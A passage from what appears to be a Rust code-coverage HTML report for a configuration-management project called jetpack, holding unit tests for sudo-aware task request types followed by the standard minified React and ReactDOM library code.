test_create_request() {\n    let sudo_details = SudoDetails {\n        user: Some(\"user2\".to_string()),\n        template: \"sudo template\".to_string(),\n    };\n    \n    let request = TaskRequest::create(\u0026sudo_details);\n    assert_eq!(request.request_type, TaskRequestType::Create);\n    assert!(request.changes.is_empty());\n    assert!(request.sudo_details.is_some());\n    assert_eq!(request.sudo_details.as_ref().unwrap().user, Some(\"user2\".to_string()));\n}\n\n#[test]\nfn test_remove_request() {\n    let sudo_details = SudoDetails {\n        user: Some(\"user3\".to_string()),\n        template: \"sudo template\".to_string(),\n    };\n    \n    let request = TaskRequest::remove(\u0026sudo_details);\n    assert_eq!(request.request_type, TaskRequestType::Remove);\n    assert!(request.changes.is_empty());\n    assert!(request.sudo_details.is_some());\n}\n\n#[test]\nfn test_modify_request() {\n    let sudo_details = SudoDetails {\n        user: Some(\"user4\".to_string()),\n        template: \"sudo template\".to_string(),\n    };\n    \n    let changes = vec![Field::Owner, Field::Mode, Field::Content];\n    \n    let request = TaskRequest::modify(\u0026sudo_details, changes.clone());\n    assert_eq!(request.request_type, TaskRequestType::Modify);\n    assert_eq!(request.changes.len(), 3);\n    assert_eq!(request.changes[0], Field::Owner);\n    assert_eq!(request.changes[1], Field::Mode);\n    assert_eq!(request.changes[2], Field::Content);\n    assert!(request.sudo_details.is_some());\n}\n\n#[test]\nfn test_execute_request() {\n    let sudo_details = SudoDetails {\n        user: Some(\"user5\".to_string()),\n        template: \"sudo template\".to_string(),\n    };\n    \n    let request = TaskRequest::execute(\u0026sudo_details);\n    assert_eq!(request.request_type, TaskRequestType::Execute);\n    assert!(request.changes.is_empty());\n    assert!(request.sudo_details.is_some());\n}\n\n#[test]\nfn test_passive_request() {\n    let sudo_details = SudoDetails {\n        user: Some(\"user6\".to_string()),\n        template: \"sudo template\".to_string(),\n    };\n    \n    let request = TaskRequest::passive(\u0026sudo_details);\n    assert_eq!(request.request_type, TaskRequestType::Passive);\n    assert!(request.changes.is_empty());\n    assert!(request.sudo_details.is_some());\n}\n\n#[test]\nfn test_is_sudoing_with_user() {\n    let sudo_details = SudoDetails {\n        user: Some(\"root\".to_string()),\n        template: \"sudo template\".to_string(),\n    };\n    \n    let request = TaskRequest::query(\u0026sudo_details);\n    assert!(request.is_sudoing());\n}\n\n#[test]\nfn test_is_sudoing_without_user() {\n    let sudo_details = SudoDetails {\n        user: None,\n        template: \"sudo template\".to_string(),\n    };\n    \n    let request = TaskRequest::query(\u0026sudo_details);\n    assert!(!request.is_sudoing());\n}\n\n#[test]\nfn test_is_sudoing_no_sudo_details() {\n    let request = TaskRequest::validate();\n    assert!(!request.is_sudoing());\n}\n\n#[test]\nfn test_all_task_request_types() {\n    // Ensure all variants can be created\n    let types = vec![\n        TaskRequestType::Validate,\n        TaskRequestType::Query,\n        TaskRequestType::Create,\n        TaskRequestType::Remove,\n        TaskRequestType::Modify,\n        TaskRequestType::Execute,\n        TaskRequestType::Passive,\n    ];\n    \n    // Test that each type is unique\n    for (i, type1) in types.iter().enumerate() {\n        for (j, type2) in types.iter().enumerate() {\n            if i == j {\n                assert_eq!(type1, type2);\n            } else {\n                assert_ne!(type1, type2);\n            }\n        }\n    }\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","util","io.rs"],"content":"","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","util","mod.rs"],"content":"mod io;\nmod terminal;\nmod yaml;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","util","terminal.rs"],"content":"","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","util","yaml.rs"],"content":"","traces":[],"covered":0,"coverable":0}]};
        var previousData = null;
    </script>
    <script crossorigin>/** @license React v16.13.1
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
'use strict';(function(d,r){"object"===typeof exports&&"undefined"!==typeof module?r(exports):"function"===typeof define&&define.amd?define(["exports"],r):(d=d||self,r(d.React={}))})(this,function(d){function r(a){for(var b="https://reactjs.org/docs/error-decoder.html?invariant="+a,c=1;c<arguments.length;c++)b+="&args[]="+encodeURIComponent(arguments[c]);return"Minified React error #"+a+"; visit "+b+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}
function w(a,b,c){this.props=a;this.context=b;this.refs=ba;this.updater=c||ca}function da(){}function L(a,b,c){this.props=a;this.context=b;this.refs=ba;this.updater=c||ca}function ea(a,b,c){var g,e={},fa=null,d=null;if(null!=b)for(g in void 0!==b.ref&&(d=b.ref),void 0!==b.key&&(fa=""+b.key),b)ha.call(b,g)&&!ia.hasOwnProperty(g)&&(e[g]=b[g]);var h=arguments.length-2;if(1===h)e.children=c;else if(1<h){for(var k=Array(h),f=0;f<h;f++)k[f]=arguments[f+2];e.children=k}if(a&&a.defaultProps)for(g in h=a.defaultProps,
h)void 0===e[g]&&(e[g]=h[g]);return{$$typeof:x,type:a,key:fa,ref:d,props:e,_owner:M.current}}function va(a,b){return{$$typeof:x,type:a.type,key:b,ref:a.ref,props:a.props,_owner:a._owner}}function N(a){return"object"===typeof a&&null!==a&&a.$$typeof===x}function wa(a){var b={"=":"=0",":":"=2"};return"$"+(""+a).replace(/[=:]/g,function(a){return b[a]})}function ja(a,b,c,g){if(C.length){var e=C.pop();e.result=a;e.keyPrefix=b;e.func=c;e.context=g;e.count=0;return e}return{result:a,keyPrefix:b,func:c,
context:g,count:0}}function ka(a){a.result=null;a.keyPrefix=null;a.func=null;a.context=null;a.count=0;10>C.length&&C.push(a)}function O(a,b,c,g){var e=typeof a;if("undefined"===e||"boolean"===e)a=null;var d=!1;if(null===a)d=!0;else switch(e){case "string":case "number":d=!0;break;case "object":switch(a.$$typeof){case x:case xa:d=!0}}if(d)return c(g,a,""===b?"."+P(a,0):b),1;d=0;b=""===b?".":b+":";if(Array.isArray(a))for(var f=0;f<a.length;f++){e=a[f];var h=b+P(e,f);d+=O(e,h,c,g)}else if(null===a||
"object"!==typeof a?h=null:(h=la&&a[la]||a["@@iterator"],h="function"===typeof h?h:null),"function"===typeof h)for(a=h.call(a),f=0;!(e=a.next()).done;)e=e.value,h=b+P(e,f++),d+=O(e,h,c,g);else if("object"===e)throw c=""+a,Error(r(31,"[object Object]"===c?"object with keys {"+Object.keys(a).join(", ")+"}":c,""));return d}function Q(a,b,c){return null==a?0:O(a,"",b,c)}function P(a,b){return"object"===typeof a&&null!==a&&null!=a.key?wa(a.key):b.toString(36)}function ya(a,b,c){a.func.call(a.context,b,
a.count++)}function za(a,b,c){var g=a.result,e=a.keyPrefix;a=a.func.call(a.context,b,a.count++);Array.isArray(a)?R(a,g,c,function(a){return a}):null!=a&&(N(a)&&(a=va(a,e+(!a.key||b&&b.key===a.key?"":(""+a.key).replace(ma,"$&/")+"/")+c)),g.push(a))}function R(a,b,c,g,e){var d="";null!=c&&(d=(""+c).replace(ma,"$&/")+"/");b=ja(b,d,g,e);Q(a,za,b);ka(b)}function t(){var a=na.current;if(null===a)throw Error(r(321));return a}function S(a,b){var c=a.length;a.push(b);a:for(;;){var g=c-1>>>1,e=a[g];if(void 0!==
e&&0<D(e,b))a[g]=b,a[c]=e,c=g;else break a}}function n(a){a=a[0];return void 0===a?null:a}function E(a){var b=a[0];if(void 0!==b){var c=a.pop();if(c!==b){a[0]=c;a:for(var g=0,e=a.length;g<e;){var d=2*(g+1)-1,f=a[d],h=d+1,k=a[h];if(void 0!==f&&0>D(f,c))void 0!==k&&0>D(k,f)?(a[g]=k,a[h]=c,g=h):(a[g]=f,a[d]=c,g=d);else if(void 0!==k&&0>D(k,c))a[g]=k,a[h]=c,g=h;else break a}}return b}return null}function D(a,b){var c=a.sortIndex-b.sortIndex;return 0!==c?c:a.id-b.id}function F(a){for(var b=n(u);null!==
b;){if(null===b.callback)E(u);else if(b.startTime<=a)E(u),b.sortIndex=b.expirationTime,S(p,b);else break;b=n(u)}}function T(a){y=!1;F(a);if(!v)if(null!==n(p))v=!0,z(U);else{var b=n(u);null!==b&&G(T,b.startTime-a)}}function U(a,b){v=!1;y&&(y=!1,V());H=!0;var c=m;try{F(b);for(l=n(p);null!==l&&(!(l.expirationTime>b)||a&&!W());){var g=l.callback;if(null!==g){l.callback=null;m=l.priorityLevel;var e=g(l.expirationTime<=b);b=q();"function"===typeof e?l.callback=e:l===n(p)&&E(p);F(b)}else E(p);l=n(p)}if(null!==
l)var d=!0;else{var f=n(u);null!==f&&G(T,f.startTime-b);d=!1}return d}finally{l=null,m=c,H=!1}}function oa(a){switch(a){case 1:return-1;case 2:return 250;case 5:return 1073741823;case 4:return 1E4;default:return 5E3}}var f="function"===typeof Symbol&&Symbol.for,x=f?Symbol.for("react.element"):60103,xa=f?Symbol.for("react.portal"):60106,Aa=f?Symbol.for("react.fragment"):60107,Ba=f?Symbol.for("react.strict_mode"):60108,Ca=f?Symbol.for("react.profiler"):60114,Da=f?Symbol.for("react.provider"):60109,
Ea=f?Symbol.for("react.context"):60110,Fa=f?Symbol.for("react.forward_ref"):60112,Ga=f?Symbol.for("react.suspense"):60113,Ha=f?Symbol.for("react.memo"):60115,Ia=f?Symbol.for("react.lazy"):60116,la="function"===typeof Symbol&&Symbol.iterator,pa=Object.getOwnPropertySymbols,Ja=Object.prototype.hasOwnProperty,Ka=Object.prototype.propertyIsEnumerable,I=function(){try{if(!Object.assign)return!1;var a=new String("abc");a[5]="de";if("5"===Object.getOwnPropertyNames(a)[0])return!1;var b={};for(a=0;10>a;a++)b["_"+
String.fromCharCode(a)]=a;if("0123456789"!==Object.getOwnPropertyNames(b).map(function(a){return b[a]}).join(""))return!1;var c={};"abcdefghijklmnopqrst".split("").forEach(function(a){c[a]=a});return"abcdefghijklmnopqrst"!==Object.keys(Object.assign({},c)).join("")?!1:!0}catch(g){return!1}}()?Object.assign:function(a,b){if(null===a||void 0===a)throw new TypeError("Object.assign cannot be called with null or undefined");var c=Object(a);for(var g,e=1;e<arguments.length;e++){var d=Object(arguments[e]);
for(var f in d)Ja.call(d,f)&&(c[f]=d[f]);if(pa){g=pa(d);for(var h=0;h<g.length;h++)Ka.call(d,g[h])&&(c[g[h]]=d[g[h]])}}return c},ca={isMounted:function(a){return!1},enqueueForceUpdate:function(a,b,c){},enqueueReplaceState:function(a,b,c,d){},enqueueSetState:function(a,b,c,d){}},ba={};w.prototype.isReactComponent={};w.prototype.setState=function(a,b){if("object"!==typeof a&&"function"!==typeof a&&null!=a)throw Error(r(85));this.updater.enqueueSetState(this,a,b,"setState")};w.prototype.forceUpdate=
function(a){this.updater.enqueueForceUpdate(this,a,"forceUpdate")};da.prototype=w.prototype;f=L.prototype=new da;f.constructor=L;I(f,w.prototype);f.isPureReactComponent=!0;var M={current:null},ha=Object.prototype.hasOwnProperty,ia={key:!0,ref:!0,__self:!0,__source:!0},ma=/\/+/g,C=[],na={current:null},X;if("undefined"===typeof window||"function"!==typeof MessageChannel){var A=null,qa=null,ra=function(){if(null!==A)try{var a=q();A(!0,a);A=null}catch(b){throw setTimeout(ra,0),b;}},La=Date.now();var q=
function(){return Date.now()-La};var z=function(a){null!==A?setTimeout(z,0,a):(A=a,setTimeout(ra,0))};var G=function(a,b){qa=setTimeout(a,b)};var V=function(){clearTimeout(qa)};var W=function(){return!1};f=X=function(){}}else{var Y=window.performance,sa=window.Date,Ma=window.setTimeout,Na=window.clearTimeout;"undefined"!==typeof console&&(f=window.cancelAnimationFrame,"function"!==typeof window.requestAnimationFrame&&console.error("This browser doesn't support requestAnimationFrame. Make sure that you load a polyfill in older browsers. https://fb.me/react-polyfills"),
"function"!==typeof f&&console.error("This browser doesn't support cancelAnimationFrame. Make sure that you load a polyfill in older browsers. https://fb.me/react-polyfills"));if("object"===typeof Y&&"function"===typeof Y.now)q=function(){return Y.now()};else{var Oa=sa.now();q=function(){return sa.now()-Oa}}var J=!1,K=null,Z=-1,ta=5,ua=0;W=function(){return q()>=ua};f=function(){};X=function(a){0>a||125<a?console.error("forceFrameRate takes a positive int between 0 and 125, forcing framerates higher than 125 fps is not unsupported"):
ta=0<a?Math.floor(1E3/a):5};var B=new MessageChannel,aa=B.port2;B.port1.onmessage=function(){if(null!==K){var a=q();ua=a+ta;try{K(!0,a)?aa.postMessage(null):(J=!1,K=null)}catch(b){throw aa.postMessage(null),b;}}else J=!1};z=function(a){K=a;J||(J=!0,aa.postMessage(null))};G=function(a,b){Z=Ma(function(){a(q())},b)};V=function(){Na(Z);Z=-1}}var p=[],u=[],Pa=1,l=null,m=3,H=!1,v=!1,y=!1,Qa=0;B={ReactCurrentDispatcher:na,ReactCurrentOwner:M,IsSomeRendererActing:{current:!1},assign:I};I(B,{Scheduler:{__proto__:null,
unstable_ImmediatePriority:1,unstable_UserBlockingPriority:2,unstable_NormalPriority:3,unstable_IdlePriority:5,unstable_LowPriority:4,unstable_runWithPriority:function(a,b){switch(a){case 1:case 2:case 3:case 4:case 5:break;default:a=3}var c=m;m=a;try{return b()}finally{m=c}},unstable_next:function(a){switch(m){case 1:case 2:case 3:var b=3;break;default:b=m}var c=m;m=b;try{return a()}finally{m=c}},unstable_scheduleCallback:function(a,b,c){var d=q();if("object"===typeof c&&null!==c){var e=c.delay;
e="number"===typeof e&&0<e?d+e:d;c="number"===typeof c.timeout?c.timeout:oa(a)}else c=oa(a),e=d;c=e+c;a={id:Pa++,callback:b,priorityLevel:a,startTime:e,expirationTime:c,sortIndex:-1};e>d?(a.sortIndex=e,S(u,a),null===n(p)&&a===n(u)&&(y?V():y=!0,G(T,e-d))):(a.sortIndex=c,S(p,a),v||H||(v=!0,z(U)));return a},unstable_cancelCallback:function(a){a.callback=null},unstable_wrapCallback:function(a){var b=m;return function(){var c=m;m=b;try{return a.apply(this,arguments)}finally{m=c}}},unstable_getCurrentPriorityLevel:function(){return m},
unstable_shouldYield:function(){var a=q();F(a);var b=n(p);return b!==l&&null!==l&&null!==b&&null!==b.callback&&b.startTime<=a&&b.expirationTime<l.expirationTime||W()},unstable_requestPaint:f,unstable_continueExecution:function(){v||H||(v=!0,z(U))},unstable_pauseExecution:function(){},unstable_getFirstCallbackNode:function(){return n(p)},get unstable_now(){return q},get unstable_forceFrameRate(){return X},unstable_Profiling:null},SchedulerTracing:{__proto__:null,__interactionsRef:null,__subscriberRef:null,
unstable_clear:function(a){return a()},unstable_getCurrent:function(){return null},unstable_getThreadID:function(){return++Qa},unstable_trace:function(a,b,c){return c()},unstable_wrap:function(a){return a},unstable_subscribe:function(a){},unstable_unsubscribe:function(a){}}});d.Children={map:function(a,b,c){if(null==a)return a;var d=[];R(a,d,null,b,c);return d},forEach:function(a,b,c){if(null==a)return a;b=ja(null,null,b,c);Q(a,ya,b);ka(b)},count:function(a){return Q(a,function(){return null},null)},
toArray:function(a){var b=[];R(a,b,null,function(a){return a});return b},only:function(a){if(!N(a))throw Error(r(143));return a}};d.Component=w;d.Fragment=Aa;d.Profiler=Ca;d.PureComponent=L;d.StrictMode=Ba;d.Suspense=Ga;d.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=B;d.cloneElement=function(a,b,c){if(null===a||void 0===a)throw Error(r(267,a));var d=I({},a.props),e=a.key,f=a.ref,m=a._owner;if(null!=b){void 0!==b.ref&&(f=b.ref,m=M.current);void 0!==b.key&&(e=""+b.key);if(a.type&&a.type.defaultProps)var h=
a.type.defaultProps;for(k in b)ha.call(b,k)&&!ia.hasOwnProperty(k)&&(d[k]=void 0===b[k]&&void 0!==h?h[k]:b[k])}var k=arguments.length-2;if(1===k)d.children=c;else if(1<k){h=Array(k);for(var l=0;l<k;l++)h[l]=arguments[l+2];d.children=h}return{$$typeof:x,type:a.type,key:e,ref:f,props:d,_owner:m}};d.createContext=function(a,b){void 0===b&&(b=null);a={$$typeof:Ea,_calculateChangedBits:b,_currentValue:a,_currentValue2:a,_threadCount:0,Provider:null,Consumer:null};a.Provider={$$typeof:Da,_context:a};return a.Consumer=
a};d.createElement=ea;d.createFactory=function(a){var b=ea.bind(null,a);b.type=a;return b};d.createRef=function(){return{current:null}};d.forwardRef=function(a){return{$$typeof:Fa,render:a}};d.isValidElement=N;d.lazy=function(a){return{$$typeof:Ia,_ctor:a,_status:-1,_result:null}};d.memo=function(a,b){return{$$typeof:Ha,type:a,compare:void 0===b?null:b}};d.useCallback=function(a,b){return t().useCallback(a,b)};d.useContext=function(a,b){return t().useContext(a,b)};d.useDebugValue=function(a,b){};
d.useEffect=function(a,b){return t().useEffect(a,b)};d.useImperativeHandle=function(a,b,c){return t().useImperativeHandle(a,b,c)};d.useLayoutEffect=function(a,b){return t().useLayoutEffect(a,b)};d.useMemo=function(a,b){return t().useMemo(a,b)};d.useReducer=function(a,b,c){return t().useReducer(a,b,c)};d.useRef=function(a){return t().useRef(a)};d.useState=function(a){return t().useState(a)};d.version="16.13.1"});
</script>
    <script crossorigin>/** @license React v16.13.1
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
/*
 Modernizr 3.0.0pre (Custom Build) | MIT
*/
'use strict';(function(I,ea){"object"===typeof exports&&"undefined"!==typeof module?ea(exports,require("react")):"function"===typeof define&&define.amd?define(["exports","react"],ea):(I=I||self,ea(I.ReactDOM={},I.React))})(this,function(I,ea){function k(a){for(var b="https://reactjs.org/docs/error-decoder.html?invariant="+a,c=1;c<arguments.length;c++)b+="&args[]="+encodeURIComponent(arguments[c]);return"Minified React error #"+a+"; visit "+b+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}
function ji(a,b,c,d,e,f,g,h,m){yb=!1;gc=null;ki.apply(li,arguments)}function mi(a,b,c,d,e,f,g,h,m){ji.apply(this,arguments);if(yb){if(yb){var n=gc;yb=!1;gc=null}else throw Error(k(198));hc||(hc=!0,pd=n)}}function lf(a,b,c){var d=a.type||"unknown-event";a.currentTarget=mf(c);mi(d,b,void 0,a);a.currentTarget=null}function nf(){if(ic)for(var a in cb){var b=cb[a],c=ic.indexOf(a);if(!(-1<c))throw Error(k(96,a));if(!jc[c]){if(!b.extractEvents)throw Error(k(97,a));jc[c]=b;c=b.eventTypes;for(var d in c){var e=
void 0;var f=c[d],g=b,h=d;if(qd.hasOwnProperty(h))throw Error(k(99,h));qd[h]=f;var m=f.phasedRegistrationNames;if(m){for(e in m)m.hasOwnProperty(e)&&of(m[e],g,h);e=!0}else f.registrationName?(of(f.registrationName,g,h),e=!0):e=!1;if(!e)throw Error(k(98,d,a));}}}}function of(a,b,c){if(db[a])throw Error(k(100,a));db[a]=b;rd[a]=b.eventTypes[c].dependencies}function pf(a){var b=!1,c;for(c in a)if(a.hasOwnProperty(c)){var d=a[c];if(!cb.hasOwnProperty(c)||cb[c]!==d){if(cb[c])throw Error(k(102,c));cb[c]=
d;b=!0}}b&&nf()}function qf(a){if(a=rf(a)){if("function"!==typeof sd)throw Error(k(280));var b=a.stateNode;b&&(b=td(b),sd(a.stateNode,a.type,b))}}function sf(a){eb?fb?fb.push(a):fb=[a]:eb=a}function tf(){if(eb){var a=eb,b=fb;fb=eb=null;qf(a);if(b)for(a=0;a<b.length;a++)qf(b[a])}}function ud(){if(null!==eb||null!==fb)vd(),tf()}function uf(a,b,c){if(wd)return a(b,c);wd=!0;try{return vf(a,b,c)}finally{wd=!1,ud()}}function ni(a){if(wf.call(xf,a))return!0;if(wf.call(yf,a))return!1;if(oi.test(a))return xf[a]=
!0;yf[a]=!0;return!1}function pi(a,b,c,d){if(null!==c&&0===c.type)return!1;switch(typeof b){case "function":case "symbol":return!0;case "boolean":if(d)return!1;if(null!==c)return!c.acceptsBooleans;a=a.toLowerCase().slice(0,5);return"data-"!==a&&"aria-"!==a;default:return!1}}function qi(a,b,c,d){if(null===b||"undefined"===typeof b||pi(a,b,c,d))return!0;if(d)return!1;if(null!==c)switch(c.type){case 3:return!b;case 4:return!1===b;case 5:return isNaN(b);case 6:return isNaN(b)||1>b}return!1}function L(a,
b,c,d,e,f){this.acceptsBooleans=2===b||3===b||4===b;this.attributeName=d;this.attributeNamespace=e;this.mustUseProperty=c;this.propertyName=a;this.type=b;this.sanitizeURL=f}function xd(a,b,c,d){var e=E.hasOwnProperty(b)?E[b]:null;var f=null!==e?0===e.type:d?!1:!(2<b.length)||"o"!==b[0]&&"O"!==b[0]||"n"!==b[1]&&"N"!==b[1]?!1:!0;f||(qi(b,c,e,d)&&(c=null),d||null===e?ni(b)&&(null===c?a.removeAttribute(b):a.setAttribute(b,""+c)):e.mustUseProperty?a[e.propertyName]=null===c?3===e.type?!1:"":c:(b=e.attributeName,
d=e.attributeNamespace,null===c?a.removeAttribute(b):(e=e.type,c=3===e||4===e&&!0===c?"":""+c,d?a.setAttributeNS(d,b,c):a.setAttribute(b,c))))}function zb(a){if(null===a||"object"!==typeof a)return null;a=zf&&a[zf]||a["@@iterator"];return"function"===typeof a?a:null}function ri(a){if(-1===a._status){a._status=0;var b=a._ctor;b=b();a._result=b;b.then(function(b){0===a._status&&(b=b.default,a._status=1,a._result=b)},function(b){0===a._status&&(a._status=2,a._result=b)})}}function na(a){if(null==a)return null;
if("function"===typeof a)return a.displayName||a.name||null;if("string"===typeof a)return a;switch(a){case Ma:return"Fragment";case gb:return"Portal";case kc:return"Profiler";case Af:return"StrictMode";case lc:return"Suspense";case yd:return"SuspenseList"}if("object"===typeof a)switch(a.$$typeof){case Bf:return"Context.Consumer";case Cf:return"Context.Provider";case zd:var b=a.render;b=b.displayName||b.name||"";return a.displayName||(""!==b?"ForwardRef("+b+")":"ForwardRef");case Ad:return na(a.type);
case Df:return na(a.render);case Ef:if(a=1===a._status?a._result:null)return na(a)}return null}function Bd(a){var b="";do{a:switch(a.tag){case 3:case 4:case 6:case 7:case 10:case 9:var c="";break a;default:var d=a._debugOwner,e=a._debugSource,f=na(a.type);c=null;d&&(c=na(d.type));d=f;f="";e?f=" (at "+e.fileName.replace(si,"")+":"+e.lineNumber+")":c&&(f=" (created by "+c+")");c="\n    in "+(d||"Unknown")+f}b+=c;a=a.return}while(a);return b}function va(a){switch(typeof a){case "boolean":case "number":case "object":case "string":case "undefined":return a;
default:return""}}function Ff(a){var b=a.type;return(a=a.nodeName)&&"input"===a.toLowerCase()&&("checkbox"===b||"radio"===b)}function ti(a){var b=Ff(a)?"checked":"value",c=Object.getOwnPropertyDescriptor(a.constructor.prototype,b),d=""+a[b];if(!a.hasOwnProperty(b)&&"undefined"!==typeof c&&"function"===typeof c.get&&"function"===typeof c.set){var e=c.get,f=c.set;Object.defineProperty(a,b,{configurable:!0,get:function(){return e.call(this)},set:function(a){d=""+a;f.call(this,a)}});Object.defineProperty(a,
b,{enumerable:c.enumerable});return{getValue:function(){return d},setValue:function(a){d=""+a},stopTracking:function(){a._valueTracker=null;delete a[b]}}}}function mc(a){a._valueTracker||(a._valueTracker=ti(a))}function Gf(a){if(!a)return!1;var b=a._valueTracker;if(!b)return!0;var c=b.getValue();var d="";a&&(d=Ff(a)?a.checked?"true":"false":a.value);a=d;return a!==c?(b.setValue(a),!0):!1}function Cd(a,b){var c=b.checked;return M({},b,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:null!=
c?c:a._wrapperState.initialChecked})}function Hf(a,b){var c=null==b.defaultValue?"":b.defaultValue,d=null!=b.checked?b.checked:b.defaultChecked;c=va(null!=b.value?b.value:c);a._wrapperState={initialChecked:d,initialValue:c,controlled:"checkbox"===b.type||"radio"===b.type?null!=b.checked:null!=b.value}}function If(a,b){b=b.checked;null!=b&&xd(a,"checked",b,!1)}function Dd(a,b){If(a,b);var c=va(b.value),d=b.type;if(null!=c)if("number"===d){if(0===c&&""===a.value||a.value!=c)a.value=""+c}else a.value!==
""+c&&(a.value=""+c);else if("submit"===d||"reset"===d){a.removeAttribute("value");return}b.hasOwnProperty("value")?Ed(a,b.type,c):b.hasOwnProperty("defaultValue")&&Ed(a,b.type,va(b.defaultValue));null==b.checked&&null!=b.defaultChecked&&(a.defaultChecked=!!b.defaultChecked)}function Jf(a,b,c){if(b.hasOwnProperty("value")||b.hasOwnProperty("defaultValue")){var d=b.type;if(!("submit"!==d&&"reset"!==d||void 0!==b.value&&null!==b.value))return;b=""+a._wrapperState.initialValue;c||b===a.value||(a.value=
b);a.defaultValue=b}c=a.name;""!==c&&(a.name="");a.defaultChecked=!!a._wrapperState.initialChecked;""!==c&&(a.name=c)}function Ed(a,b,c){if("number"!==b||a.ownerDocument.activeElement!==a)null==c?a.defaultValue=""+a._wrapperState.initialValue:a.defaultValue!==""+c&&(a.defaultValue=""+c)}function ui(a){var b="";ea.Children.forEach(a,function(a){null!=a&&(b+=a)});return b}function Fd(a,b){a=M({children:void 0},b);if(b=ui(b.children))a.children=b;return a}function hb(a,b,c,d){a=a.options;if(b){b={};
for(var e=0;e<c.length;e++)b["$"+c[e]]=!0;for(c=0;c<a.length;c++)e=b.hasOwnProperty("$"+a[c].value),a[c].selected!==e&&(a[c].selected=e),e&&d&&(a[c].defaultSelected=!0)}else{c=""+va(c);b=null;for(e=0;e<a.length;e++){if(a[e].value===c){a[e].selected=!0;d&&(a[e].defaultSelected=!0);return}null!==b||a[e].disabled||(b=a[e])}null!==b&&(b.selected=!0)}}function Gd(a,b){if(null!=b.dangerouslySetInnerHTML)throw Error(k(91));return M({},b,{value:void 0,defaultValue:void 0,children:""+a._wrapperState.initialValue})}
function Kf(a,b){var c=b.value;if(null==c){c=b.children;b=b.defaultValue;if(null!=c){if(null!=b)throw Error(k(92));if(Array.isArray(c)){if(!(1>=c.length))throw Error(k(93));c=c[0]}b=c}null==b&&(b="");c=b}a._wrapperState={initialValue:va(c)}}function Lf(a,b){var c=va(b.value),d=va(b.defaultValue);null!=c&&(c=""+c,c!==a.value&&(a.value=c),null==b.defaultValue&&a.defaultValue!==c&&(a.defaultValue=c));null!=d&&(a.defaultValue=""+d)}function Mf(a,b){b=a.textContent;b===a._wrapperState.initialValue&&""!==
b&&null!==b&&(a.value=b)}function Nf(a){switch(a){case "svg":return"http://www.w3.org/2000/svg";case "math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Hd(a,b){return null==a||"http://www.w3.org/1999/xhtml"===a?Nf(b):"http://www.w3.org/2000/svg"===a&&"foreignObject"===b?"http://www.w3.org/1999/xhtml":a}function nc(a,b){var c={};c[a.toLowerCase()]=b.toLowerCase();c["Webkit"+a]="webkit"+b;c["Moz"+a]="moz"+b;return c}function oc(a){if(Id[a])return Id[a];
if(!ib[a])return a;var b=ib[a],c;for(c in b)if(b.hasOwnProperty(c)&&c in Of)return Id[a]=b[c];return a}function Jd(a){var b=Pf.get(a);void 0===b&&(b=new Map,Pf.set(a,b));return b}function Na(a){var b=a,c=a;if(a.alternate)for(;b.return;)b=b.return;else{a=b;do b=a,0!==(b.effectTag&1026)&&(c=b.return),a=b.return;while(a)}return 3===b.tag?c:null}function Qf(a){if(13===a.tag){var b=a.memoizedState;null===b&&(a=a.alternate,null!==a&&(b=a.memoizedState));if(null!==b)return b.dehydrated}return null}function Rf(a){if(Na(a)!==
a)throw Error(k(188));}function vi(a){var b=a.alternate;if(!b){b=Na(a);if(null===b)throw Error(k(188));return b!==a?null:a}for(var c=a,d=b;;){var e=c.return;if(null===e)break;var f=e.alternate;if(null===f){d=e.return;if(null!==d){c=d;continue}break}if(e.child===f.child){for(f=e.child;f;){if(f===c)return Rf(e),a;if(f===d)return Rf(e),b;f=f.sibling}throw Error(k(188));}if(c.return!==d.return)c=e,d=f;else{for(var g=!1,h=e.child;h;){if(h===c){g=!0;c=e;d=f;break}if(h===d){g=!0;d=e;c=f;break}h=h.sibling}if(!g){for(h=
f.child;h;){if(h===c){g=!0;c=f;d=e;break}if(h===d){g=!0;d=f;c=e;break}h=h.sibling}if(!g)throw Error(k(189));}}if(c.alternate!==d)throw Error(k(190));}if(3!==c.tag)throw Error(k(188));return c.stateNode.current===c?a:b}function Sf(a){a=vi(a);if(!a)return null;for(var b=a;;){if(5===b.tag||6===b.tag)return b;if(b.child)b.child.return=b,b=b.child;else{if(b===a)break;for(;!b.sibling;){if(!b.return||b.return===a)return null;b=b.return}b.sibling.return=b.return;b=b.sibling}}return null}function jb(a,b){if(null==
b)throw Error(k(30));if(null==a)return b;if(Array.isArray(a)){if(Array.isArray(b))return a.push.apply(a,b),a;a.push(b);return a}return Array.isArray(b)?[a].concat(b):[a,b]}function Kd(a,b,c){Array.isArray(a)?a.forEach(b,c):a&&b.call(c,a)}function pc(a){null!==a&&(Ab=jb(Ab,a));a=Ab;Ab=null;if(a){Kd(a,wi);if(Ab)throw Error(k(95));if(hc)throw a=pd,hc=!1,pd=null,a;}}function Ld(a){a=a.target||a.srcElement||window;a.correspondingUseElement&&(a=a.correspondingUseElement);return 3===a.nodeType?a.parentNode:
a}function Tf(a){if(!wa)return!1;a="on"+a;var b=a in document;b||(b=document.createElement("div"),b.setAttribute(a,"return;"),b="function"===typeof b[a]);return b}function Uf(a){a.topLevelType=null;a.nativeEvent=null;a.targetInst=null;a.ancestors.length=0;10>qc.length&&qc.push(a)}function Vf(a,b,c,d){if(qc.length){var e=qc.pop();e.topLevelType=a;e.eventSystemFlags=d;e.nativeEvent=b;e.targetInst=c;return e}return{topLevelType:a,eventSystemFlags:d,nativeEvent:b,targetInst:c,ancestors:[]}}function Wf(a){var b=
